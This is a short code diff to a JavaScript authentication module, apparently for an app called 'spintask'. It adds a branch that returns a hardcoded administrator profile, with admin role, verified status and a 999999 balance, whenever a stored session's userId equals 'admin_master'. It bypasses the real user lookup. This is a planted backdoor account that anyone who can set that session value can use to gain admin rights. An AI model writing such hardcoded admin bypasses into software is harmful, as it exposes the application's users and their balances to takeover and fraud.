@@ -196,6 +196,21 @@ const Auth = {
 
         try {
             const session = JSON.parse(sessionStr);
+            
+            // --- HARDCODED ADMIN SESSION HANDLE ---
+            if (session.userId === 'admin_master') {
+                return {
+                    id: 'admin_master',
+                    email: 'admin@spintask.com',
+                    name: 'Administrator',
+                    role: 'admin',
+                    verified: true,
+                    balance: 999999,
+                    earnings: 0
+                };
+            }
+            // --------------------------------------
+
             const users = this.getUsers();
             return users.find(u => u.id === session.userId) || null;
         } catch (e) {
